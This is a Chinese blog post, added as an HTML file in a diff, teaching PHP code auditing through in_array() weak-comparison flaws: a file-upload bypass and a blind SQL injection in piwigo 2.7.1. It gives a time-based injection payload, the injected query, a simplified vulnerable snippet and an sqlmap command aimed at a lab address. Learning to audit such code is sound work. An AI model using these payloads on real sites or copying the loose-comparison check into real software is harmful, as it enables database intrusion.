@@ -1,0 +1,462 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+<meta HTTP-EQUIV="expires" CONTENT="0"> 
+<title>PHP代码审计-01 | loecho</title>	
+
+<link rel="stylesheet" href="https://loecho.me/styles/main.css">
+<script type="text/javascript">
+function getCSS()
+{
+        datetoday = new Date();
+        timenow=datetoday.getTime();
+        datetoday.setTime(timenow);
+        thehour = datetoday.getHours();
+
+        if (thehour<0)
+
+            display = "https://loecho.me/media/css/night.css";
+
+       else if (thehour>24)
+
+            display = "https://loecho.me/media/css/night.css";   
+
+        else if (thehour>0)
+           
+            display = "https://loecho.me/media/css/day.css";
+
+        else if (thehour<24)
+
+            display = "https://loecho.me/media/css/day.css";
+      
+
+var css = '<';
+        css+='link rel="stylesheet" href='+display+' \/';
+        css+='>';
+        document.write(css);
+}
+</script>
+<link href="https://fonts.googleapis.com/css?family=Dancing+Script|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+<link href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css" rel="stylesheet" />
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://loecho.me/media/scripts/script.js'></script>
+<link href="https://cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet" />
+  <script src="https://cdn.bootcss.com/wow/1.1.2/wow.min.js"></script>
+  <script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <script>wow=new WOW({boxClass:'wow',animateClass:'animated',offset:0,mobile:true,live:true});wow.init();</script>
+
+<script type="text/javascript">
+window.onload=getCSS();
+</script>
+
+
+ 	
+</head>
+<body class="post-template-default single single-post postid-70 single-format-standard">
+    <div id="wrapper">
+        
+			
+		<header id="header" class="site-header" 
+		
+		>
+			<div class="site-branding">
+									<h1 class="site-title"><a href="https://loecho.me" rel="home">loecho</a></h1>
+										
+					<h2 class="site-description"><h4>Red Team@loecho /CTFer@Web /SRC</h4></h2>
+										
+							</div>
+			<nav id="nav-wrapper">
+				<div class="container">
+					<div class="nav-toggle">
+						<div class="bars">
+							<div class="bar"></div>
+							<div class="bar"></div>
+							<div class="bar"></div>
+						</div>
+					</div>
+					<div class="clear"></div>
+					<ul id="" class="dove">
+		 
+
+</ul>
+</li>		
+		
+</ul>				</div>
+			</nav>
+						<div class="jingge">
+
+
+    
+
+    
+			
+<a  href="https://github.com/a1ices" target="_blank" ><i class="iconfont icon-github"></i></a>
+ 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+			
+<a  href="1414596457" target="_blank" ><i class="iconfont icon-qq"></i></a>
+ 
+    
+
+    
+
+    
+        </header>
+
+		<div id="content" class="container">
+			<div class="row">
+	<div class="col-md-8 site-main">
+				
+<article id="post-70" class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
+
+	
+	                      
+		<div class="entry-content">
+			<h1 class="wow swing entry-title">PHP代码审计-01</h1>
+<div class="entry-meta">
+<div class="wow bounce">
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-25 03:02:25" itemprop="datePublished" pubdate="">2020-02-25</time></i>
+	          </div>
+			
+</span>
+													 
+		</div>
+                  
+			<div class="wow slideInLeft entry-summary song">
+				<h1 id="php代码审计01">PHP代码审计(01)</h1>
+<h2 id="前言">前言</h2>
+<p>因为现在疫情的影响,开学推迟了.开学具体日期也没有确定.正好这段时间充实自己,那感觉是极好的,看到了</p>
+<p>Gothub上,红日安全团队的一个PHP代码审计审计系列教程,学习一下!</p>
+<h2 id="day-1-in_array-函数弱比较问题">Day 1 - In_Array 函数弱比较问题</h2>
+<figure data-type="image" tabindex="1"><img src="https://s2.ax1x.com/2020/02/20/3eUG4I.png" alt="3eUG4I.png" loading="lazy"></figure>
+<p><strong>漏洞解析</strong> ：</p>
+<p>这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 <strong>in_array()</strong> 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 <strong>true</strong> ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 <strong>7shell.php</strong> 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7，而数字7在 <strong>range(1,24)</strong> 数组中，最终绕过 <strong>in_array()</strong> 函数判断，导致任意文件上传漏洞。（这里之所以会发生强制类型转换，是因为目标数组中的元素为数字类型）我们来看看PHP手册对 <strong>in_array()</strong> 函数的定义。</p>
+<h2 id="函数用途">函数用途:</h2>
+<p><strong>in_array</strong></p>
+<p><strong>(PHP 4, PHP 5, PHP 7)</strong></p>
+<p><strong>in_array — 检查数组中是否存在某个值</strong></p>
+<p><strong>定义</strong> ： <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
+<h3 id="说明">说明</h3>
+<p>in_array ( <a href="language.pseudo-types.html#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] ) : bool</p>
+<p>大海捞针，在大海（<code>haystack</code>）中搜索针（ <code>needle</code>），如果没有设置 <code>strict</code> 则使用宽松的比较</p>
+<h3 id="参数">参数</h3>
+<ul>
+<li>
+<p><code>needle</code></p>
+<p>待搜索的值。<strong>Note</strong>:如果 <code>needle</code> 是字符串，则比较是区分大小写的。</p>
+</li>
+<li>
+<p><code>haystack</code></p>
+<p>待搜索的数组。</p>
+</li>
+<li>
+<p><code>strict</code></p>
+<p>如果第三个参数 <code>strict</code> 的值为 <strong><code>TRUE</code></strong> 则 <strong>in_array()</strong> 函数还会检查 <code>needle</code> 的<a href="language.types.html">类型</a>是否和 <code>haystack</code> 中的相同。</p>
+</li>
+</ul>
+<h3 id="返回值">返回值</h3>
+<p>如果找到 <code>needle</code> 则返回 <strong><code>TRUE</code></strong>，否则返回 <strong><code>FALSE</code></strong>。</p>
+<h2 id="实例分析">实例分析:</h2>
+<h3 id="cms-piwigo271-版本">CMS:  <strong>piwigo2.7.1</strong> 版本</h3>
+<h3 id="路径-includefunctions_rateincphp">路径:  /include/functions_rate.inc.php</h3>
+<h3 id="危害-sql注入">危害: SQL注入</h3>
+<p>看了代码,发现这个版本的SQL语句是直接拼接**<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mo separator="true">,</mo><mi mathvariant="normal">而</mi><mi mathvariant="normal">且</mi></mrow><annotation encoding="application/x-tex">rate**变量,而且</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">且</span></span></span></span>rate变量只是通过in_array进行简单处理,并没有</p>
+<p>按照in_array的具体要求,添加第三个参数来进行严格匹配,,最终导致SQL注入,先看一下入口:</p>
+<figure data-type="image" tabindex="2"><img src="https://s2.ax1x.com/2020/02/20/3eBVlq.png" alt="3eBVlq.png" loading="lazy"></figure>
+<p>GET 传入参数 $rate,会执行存在问题路径下,文件rate__Picture这个函数,继续向下看,看到这个函数内部,变量rate</p>
+<p>会直接拼接到SQL语句中:</p>
+<figure data-type="image" tabindex="3"><img src="https://s2.ax1x.com/2020/02/20/3eDhqK.png" alt="3eDhqK.png" loading="lazy"></figure>
+<p>而且在前面,$rate参数就是通过in_array来进行比较的,</p>
+<p>判断 <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">否</mi><mi mathvariant="normal">在</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">rate** 是否在 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">在</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>conf['rate_items']</strong> 中， <strong>$conf['rate_items']</strong> 的内容可以在 <strong>include\config_default.inc.php</strong></p>
+<p>中找到，为 <code>$conf['rate_items'] = array(0,1,2,3,4,5);</code> 但是所用in_array函数第三个参数,没有设置为</p>
+<p>true,所以会进行弱比较,这就产生了问题,我们构造参数rate的值为:</p>
+<pre><code class="language-sql">$rate = 1,1 and if (ascii(substr((select database()),1,1))=112,1,sleep(3)));# 
+</code></pre>
+<p>拼接后,SQL语句成为:</p>
+<pre><code class="language-sql">INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,'192.168.2',1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;
+
+</code></pre>
+<p>通过这样我们就可以构造盲注!</p>
+<h3 id="总体形成这样">总体形成这样:</h3>
+<pre><code class="language-php">&lt;?php 
+$rate = $POST['rate'];
+$conf = ['rate_items'] = array(0,1,2,3,4,5);
+if (!isset($rate) or !$conf['rate'] or 	!in_array($rate,$conf['rate_items']))
+{ 
+    return false;   
+}
+
+$query = 'INSERT INTO '.RETE_TABLE.'(user_id,anonymous_id.element_id,rate,date)	
+
+		 VALUES('.$user['id.','.'\''.$anonymous_id.'\','.$image_id.','.$rate.'			
+		 ,NOW())'
+
+pwd_query($query)
+    
+?&gt;
+
+</code></pre>
+<h2 id="漏洞利用">漏洞利用 :</h2>
+<p>接下来我们直接用sqlmap进行验证， <strong>payload</strong> 如下：</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://192.168.2.211/piwigo/picture.php?/1/category/1&amp;action=rate&quot; --data &quot;rate=1&quot; --dbs --batch
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://s2.ax1x.com/2020/02/20/3ecycj.png" alt="3ecycj.png" loading="lazy"></figure>
+
+							</div>
+	<div class="wow bounceInDown vt-post-tags">
+ 
+					</div>						
+<nav class="navigation3 post-navigation3" role="navigation">
+		
+		<div class="nav-links3">
+      
+		<div class="wow bounceInLeft nav-previous3"><a href="https://loecho.me/php02/" rel="prev"> PHP代码审计-02</a></div>
+		 
+		 
+		<div class="wow bounceInRight nav-next3"><a href="https://loecho.me/ssrf/" rel="next"> SSRF漏洞挖掘技巧</a></div>
+		
+		</div>
+	</nav>
+	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
+	<div class="author-avatar pull-left"><img src="https://loecho.me/images/avatar.png" ></div>
+ 
+	<div class="author-description"><div class="author-title"><div class="author-link" rel="author">Loecho</div></div>
+
+
+	<p class="author-bio">Red Team@loecho /CTFer@Web /SRC</p></div></div>
+	
+		</div>
+		
+ 
+		
+</article>
+
+<div id="marlin_lite_about_widget-2" class="wow bounceInUp widget marlin_lite_about_widget" data-wow-delay="0.1s">
+		
+        
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://loecho.me/media/scripts/Valine.min.js'></script>
+
+<div class="comment"></div>
+<script>
+        new Valine({
+            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+            av: AV, 
+            el: '.comment',
+            lang: 'zh-cn',
+            
+            admin_email:'1414596457@qq.com',
+            
+            
+      emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+     	
+      	
+          
+      placeholder: '欢迎质疑'
+       
+        });
+    </script> 
+
+
+   
+  
+ 
+
+		</div>
+
+			</div>
+			
+
+
+<div class="tocc col l3 hide-on-med-and-down">
+	
+        <div class="toc-widget">
+			
+            <div class="toc-title"></div>
+			
+            <div id="toc-content">
+			
+			
+			</div>
+        </div>
+    </div>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.5.0/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '.entry-summary',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('.entry-summary').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>										 
+
+ 
+       
+
+
+			</div>
+		</div>
+
+		
+		 	<footer id="colophon" class="site-footer">
+
+			<div class="container">
+	
+				<div class="copyright"><a>Red Team@loecho /CTFer@Web /SRC </a><br>Theme:   <a href="https://github.com/shanbufun/gridea-theme-pan" target="_blank" title="Pan"><span>Pan</span></a>.  by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >Shanbufun</a></div>		
+			</div>
+		
+		</footer>
+
+</div>
+
+<script src="https://cdn.bootcss.com/fitvids/1.2.0/jquery.fitvids.min.js"></script>
+<script type='text/javascript' src='https://loecho.me/media/scripts/marlin-scripts.js'></script>
+ <script src="//tokinx.github.io/lately/lately.min.js"></script>
+  <script>jQuery(document).ready(function(){$.lately({'target':'.lately-a,.lately-b,.lately-c'})});</script>
+  <style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span><i class="iconfont icon-xiangshang"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+		<script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $('.navigation:eq(0)').remove();
+                $("").attr("rel" , "external");
+                $("a[rel='external'],a[rel='external nofollow']").attr("target","_blank");
+                $("a.vi").attr("rel" , "");
+                $.viewImage({
+                    'target'  : 'img',
+                    'exclude' : '.vsmile-icons img,.gallery img',
+                    'delay'   : 300
+                });
+                $.lately({
+                    'target' : '.commentmetadata a,.infos time,.post-list time'
+                });
+                prettyPrint();
+                
+                $('ul.links li a').each(function(){
+                    if($(this).parent().find('.bg').length==0){
+                        $(this).parent().append('<!---<div class="bg" style="background-image:url(https://c3.glgoo.top/s2/favicons?domain='+$(this).attr("href")+')"></div>--->')
+                    }
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+
+</body>
+</html>
